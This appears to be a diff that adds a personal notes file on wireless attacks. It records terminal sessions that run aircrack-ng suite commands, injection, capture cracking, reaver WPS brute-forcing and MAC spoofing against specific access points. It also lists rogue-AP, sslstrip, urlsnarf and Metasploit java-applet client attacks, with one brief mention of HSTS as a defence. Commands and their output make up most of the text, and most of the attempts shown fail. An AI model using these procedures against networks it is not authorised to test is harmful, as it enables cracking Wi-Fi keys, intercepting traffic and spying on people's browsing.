@@ -1,0 +1,131 @@
+
+
+.. we will use some tools to test our wireless network here.
+
+ ⚡ 1996 [03:30 PM]  /home/masum   master ●   airmon-ng 
+
+
+Interface	Chipset		Driver
+
+wlan0		Atheros AR9285	ath9k - [phy0]
+
+ ⚡ 1997 [03:30 PM]  /home/masum   master ●   airmon-ng start wlan0
+
+
+Found 3 processes that could cause trouble.
+If airodump-ng, aireplay-ng or airtun-ng stops working after
+a short period of time, you may want to kill (some of) them!
+-e 
+PID	Name
+4125	NetworkManager
+4424	wpa_supplicant
+4554	dhclient
+Process with PID 4554 (dhclient) is running on interface wlan0
+
+
+Interface	Chipset		Driver
+
+wlan0		Atheros AR9285	ath9k - [phy0]SIOCSIFFLAGS: Name not unique on network
+
+				(monitor mode enabled on mon0)
+
+ ⚡ 1998 [03:32 PM]  /home/masum   master ●   
+ 
+.. if you dont find any interface which will work for the command
+.. airodump-ng mon0 then better start kismet which will creat one 
+.. mon0mon monitor interfacce for you and you can then run the command
+.. airodump-ng mon0mon like the follwoing
+
+root@kali# airodump-ng mon0mon
+
+.. the above command will show all the BSSID along with all the channels
+.. and encryptions of the AP.
+
+root@kali# airodump-ng --channel 10 -w capture --bssid D0:17:C2:3D:CA:A0 --ignore-negative-one mon0mon
+
+root@kali# aireplay-ng -1 1000 -q 10 -e D0:17:C2:3D:CA:A0 -a D0:17:C2:3D:CA:A0 --ignore-negative-one mon0mon
+
+No source MAC (-h) specified. Using the device MAC (E0:B9:A5:7F:56:1D)
+16:32:37  Waiting for beacon frame (BSSID: D0:17:C2:3D:CA:A0) on channel -1
+
+Attack was unsuccessful. Possible reasons:
+
+    * Perhaps MAC address filtering is enabled.
+    * Check that the BSSID (-a option) is correct.
+    * Try to change the number of packets (-o option).
+    * The driver/card doesn't support injection.
+    * This attack sometimes fails against some APs.
+    * The card is not on the same channel as the AP.
+    * You're too far from the AP. Get closer, or lower
+      the transmit rate.
+... 
+... see aireplay-ng --help for more details.
+
+.. then type the followings
+
+aireplay-ng -3 -b D0:17:C2:3D:CA:A0 -h 00:11:22:33:44:55 --ignore-negative-one mon0mon
+
+The interface MAC (E0:B9:A5:7F:56:1D) doesn't match the specified MAC (-h).
+	ifconfig mon0mon hw ether 00:11:22:33:44:55
+16:37:42  Waiting for beacon frame (BSSID: D0:17:C2:3D:CA:A0) on channel -1
+16:37:52  No such BSSID available.
+Please specify an ESSID (-e).
+
+.. try to crack the pcap file
+
+ aircrack-ng capture-01.cap
+
+Opening capture-01.cap
+Read 23 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  F4:F2:6D:81:7D:5E  chadni                    No data - WEP or WPA
+
+Choosing first network as target.
+
+Opening capture-01.cap
+Got no data packets from target network!
+
+
+Quitting aircrack-ng...
+
+.. trying to crack wpa and wpa2. wpa and wpa2 is different algorithm to protect
+.. the wireless network. wpa uses tkip while wpa2 uses tkip and aes both.
+.. wpa2 uses the wpa2-psk(aes) for business and wpa2-personal aes for home user.
+.. it is also recommend to use eap instead of psk
+
+reaver -i wlan0mon -b EC:08:6B:E9:6E:06 -vv --no-nacks
+
+Reaver v1.4 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Waiting for beacon from EC:08:6B:E9:6E:06
+[+] Switching wlan0mon to channel 1
+
+.. if successful to crack wpa key by using this tools you will get the wpa
+.. passphrase and pin.
+
+.. mac changer
+
+macchanger –-random wlan0::
+macchanger --–mac=00:11:22:33:44:55 wlan0
+
+.. kermasploit: which is used to do mitm can configure and offer rougue AP to 
+.. connect and it them exploit the user based on metasploit vulnerability. this
+.. can be downloaded from git clone git://github.com/SilverFoxx/PwnSTAR.git
+.. setup is easy.
+
+.. jasager is another wireless tools to audit and xploit wireless network.
+.. sslstrip 
+.. urlsnarf is another tool to allow attacker to see which websites
+.. are viewed by the victims.
+.. to prevent any of this happens on you, you can use http strict transport 
+.. security(HSTS) which prevent https from downgrading the security when
+.. any cockie or browser hijacking happens.
+
+.. java signed applet is another plugins in metasploit which will creat
+.. one vulnerable website which will exploit the client windows machine if 
+.. he visits the site with absolute java plugins.
+
+
